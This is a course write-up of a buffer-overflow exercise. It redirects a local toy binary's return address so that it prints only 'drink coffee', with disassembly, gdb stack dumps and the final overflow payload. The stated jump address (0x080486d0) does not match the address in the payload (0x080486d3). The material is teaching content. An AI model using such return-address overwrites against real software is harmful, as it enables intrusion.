# buffer-overflow-exercises
collection of buffer-overflow based challenges from advanced-cyber course in College Of Managment
## 3st task
**Goal:** make the binary print "drink coffee"  

First we run the binary:
```
$ ./three 
testpassword
Do not drink coffee
 ```
We can see that upon entering a password the following two strings are printed- “Do not” and “drink coffee”. 
```assembly
Dump of assembler code for function main:
   0x080486a8 <+0>:     lea    ecx,[esp+0x4]
   0x080486ac <+4>:     and    esp,0xfffffff0
   0x080486af <+7>:     push   DWORD PTR [ecx-0x4]
   0x080486b2 <+10>:    push   ebp
   0x080486b3 <+11>:    mov    ebp,esp
   0x080486b5 <+13>:    push   ecx
   0x080486b6 <+14>:    sub    esp,0x4
   0x080486b9 <+17>:    call   0x804868b <_Z3foov>
   0x080486be <+22>:    sub    esp,0x8
   0x080486c1 <+25>:    push   0x80487e0
   0x080486c6 <+30>:    push   0x804a0e0
   0x080486cb <+35>:    call   0x8048560 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>        
   0x080486d0 <+40>:    add    esp,0x10
   0x080486d3 <+43>:    sub    esp,0x8
   0x080486d6 <+46>:    push   0x80487e8
   0x080486db <+51>:    push   0x804a0e0
   0x080486e0 <+56>:    call   0x8048560 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>        
   0x080486e5 <+61>:    add    esp,0x10
   0x080486e8 <+64>:    mov    eax,0x0
   0x080486ed <+69>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x080486f0 <+72>:    leave
   0x080486f1 <+73>:    lea    esp,[ecx-0x4]
   0x080486f4 <+76>:    ret
End of assembler dump.
```
Our target is to execute only the “drink coffee” print without the “Do not” print.
After a brief look on the assembly code we can see that there are two prints - <+35> and <+56> there is no jump or compare before any of them so we need to think of a way to tamper with the execution flow.

<+17> we can see a call to foo. let’s disassemble using ghidra:
```C
void foo(void)
{
  char local_lc[24];
  cin >> local_lc;
  return;
}
```
We can use a buffer overflow attack and manipulate the return instruction pointer into our liking.  
Lets examine the stack upon entering a value:
```
$ gdb three
$ b *foo+27
$ r <<(python2 -c "print('A'*24)")
```
```
gef➤  x/10x $esp
0xffffcf60:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf70:     0x41414141      0x41414141      0xffffcf00      0x080486be
0xffffcf80:     0xffffcfb0      0xffffcfa0
```
After inserting the letter ‘A’ 24 times, we can see the hex code 41 appears 24 times in our stack
Another interesting thing we can see is the return address (0x080486be) in the stack, right after the saved frame pointer address.
So, after inspecting the stack we can assume it looks like this:
```
top of the stack                                             bottom of stack
<------ [            buf[24]            ] [ ebp  ] [  ret  ]
bottom of memory                                             top of memory
```
In order to change the execution flow we want to change the saved eip to skip the “Do not” print.  

After understanding the security flaw we can **overwrite the return address** by exploiting the buffer overflow.
We’ll craft the payload like this: 24 characters for padding + main’s ebp + new return address

The line we need to jump to is line <main +40> 0x080486d0  
The os is using Little endian architecture

![image](https://github.com/0xtal4/buffer-overflow-exercises/assets/48101413/8a8ed180-4a35-4715-970a-99d88ecbb893)  

So, in order to overwrite the eip to **0x080486d0** we need to write **0xd0860408**
In order to avoid segfault we need to overwrite the correct saved frame pointer to the ebp of main.

```
gef➤  info registers
eax            0x80486a8           0x80486a8
ecx            0xffffcfa0          0xffffcfa0
edx            0xffffcfc0          0xffffcfc0
ebx            0xf7a1dff4          0xf7a1dff4
esp            0xffffcf88          0xffffcf88
ebp            0xffffcf88          0xffffcf88
esi            0x8048760           0x8048760
edi            0xf7ffcba0          0xf7ffcba0
eip            0x80486b5           0x80486b5 <main+13>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```

The final payload will be                             
python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')"

```
gef➤  r <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
Starting program: /home/kali/Desktop/tasks/files/three <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
[Thread debugging using libthread_db enabled]                                                                                                                                                
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                                                   
drink coffee[Inferior 1 (process 28524) exited normally]
```
Success! “drink coffee” is printed!


